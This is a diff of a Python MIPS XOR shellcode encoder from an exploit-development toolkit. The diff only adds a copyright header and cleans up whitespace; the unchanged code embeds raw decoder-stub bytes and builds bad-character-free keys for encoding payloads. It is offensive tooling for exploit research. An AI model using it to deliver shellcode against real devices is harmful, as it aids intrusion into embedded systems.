@@ -1,3 +1,9 @@
+# Copyright (c) 2013
+# - Zachary Cutlip <uid000@gmail.com>
+# - Tactical Network Solutions, LLC
+# 
+# See LICENSE.txt for more details.
+# 
 import string
 import random
 import struct
@@ -14,7 +20,7 @@ class MipsXorEncoder(XorEncoder):
     """
     MAX_ATTEMPTS=10
     decoders={}
-    decoders[LittleEndian] = string.join([ 
+    decoders[LittleEndian] = string.join([
         "SIZ2SIZ1\x0e\x24",    # li t6,-5
         "\x27\x70\xc0\x01",    # nor	t6,t6,zero
         "\xa3\xff\x0b\x24",    # li	t3,-93
@@ -46,7 +52,7 @@ class MipsXorEncoder(XorEncoder):
         "\x0c\x54\x4a\x01"     # syscall   0x52950
         ],'')
 
-    decoders[BigEndian] = string.join([ 
+    decoders[BigEndian] = string.join([
         "\x24\x0eSIZ1SIZ2",    # li	t6,-5
         "\x01\xc0\x70\x27",    # nor	t6,t6,zero
         "\x24\x0b\xff\xa3",    # li	t3,-93
@@ -76,7 +82,7 @@ class MipsXorEncoder(XorEncoder):
         "\x27\xa4\xff\xf8",    # addiu	a0,sp,-8
         "\x24\x02\x10\x46",    # li	v0,4166
         "\x01\x4a\x54\x0c"    # syscall	0x52950
-        ],'') 
+        ],'')
     def __has_badchars(self,data,badchars):
         badchar_list=[]
         for char in badchars:
@@ -86,21 +92,21 @@ class MipsXorEncoder(XorEncoder):
 
         return badchar_list
 
-        
+
     def __pack_key(self,key):
         if self.endianness==BigEndian:
             packed_key=struct.pack('>I',key)
         else:
             packed_key=struct.pack('<I',key)
         return packed_key
-        
+
     #TODO: Does this need to be moved to superclass?
     def __generate_key(self,triedkeys,badchars):
         minbyte=0x01
         maxbyte=0xff
         key=0
         random.seed()
-        
+
         #keep trying until we find an original key
         while True:
             self.logger.LOG_INFO("Generating key.")
@@ -111,13 +117,13 @@ class MipsXorEncoder(XorEncoder):
                         self.logger.LOG_DEBUG("bad byte when generating key : %#04x"% byte)
                     else:
                         break
-                key=key | byte << (i * 8) 
+                key=key | byte << (i * 8)
             self.logger.LOG_DEBUG("Key: %#010x" % key)
             key=self.__pack_key(key)
 
             if not key in triedkeys:
                 break
-        
+
         return key
 
 
@@ -134,11 +140,11 @@ class MipsXorEncoder(XorEncoder):
             specified in badchars, an exception is raised.
         logger: Optional logger object. If none is provided, a logger will be
             instantiated with output to stdout.
-            
+
         Raises EncoderException
         """
-        
-        
+
+
         if not logger:
             logger=Logging()
 
@@ -147,18 +153,18 @@ class MipsXorEncoder(XorEncoder):
         self.badchars=parse_badchars(badchars)
         self.logger.LOG_DEBUG("bad char count: %d" % len(self.badchars))
         generate_key=False
-        
+
         self.key=key
 
         if len(payload.shellcode) % 4 != 0:
             raise "Payload length must be a multiple of 4 bytes."
-        
+
         size=(len(payload.shellcode)/4)+1
         if size > 0xffff:
             raise "Payload length %d is too long." % len(payload.shellcode)
-        
+
         size = size ^ 0xffff
-        
+
         sizelo=size & 0xff
         sizehi=size >> 8
 
@@ -166,7 +172,7 @@ class MipsXorEncoder(XorEncoder):
         decoder=decoder.replace("SIZ1",chr(sizehi))
         decoder=decoder.replace("SIZ2",chr(sizelo)) #SIZ1SIZ2 == sizehisizelo
         decoder_badchars=self.__has_badchars(decoder,self.badchars)
-        
+
         if len(decoder_badchars) > 0:
             raise EncoderException("Decoder stub contains bad bytes: %s" % str(decoder_badchars))
         self.logger.LOG_DEBUG("No bad bytes in decoder stub.")
@@ -187,7 +193,7 @@ class MipsXorEncoder(XorEncoder):
             if not self.key:
                 self.key=self.__generate_key(tried_keys,self.badchars)
                 tried_keys.append(self.key)
-            
+
             encoded_shellcode=self.encode(payload.shellcode,self.key)
             encoded_badchars=self.__has_badchars(encoded_shellcode,self.badchars)
 
@@ -196,15 +202,15 @@ class MipsXorEncoder(XorEncoder):
                 attempts -= 1
             else:
                 break
-        
+
         if not self.key:
             raise Exception("Failed to encode payload without bad bytes.")
-            
+
         self.shellcode=decoder+self.key+encoded_shellcode
-    
+
     def pretty_string(self):
         return pretty_string(self.shellcode)
-        
+
     def __str__(self):
         data=""
         for c in self.shellcode:
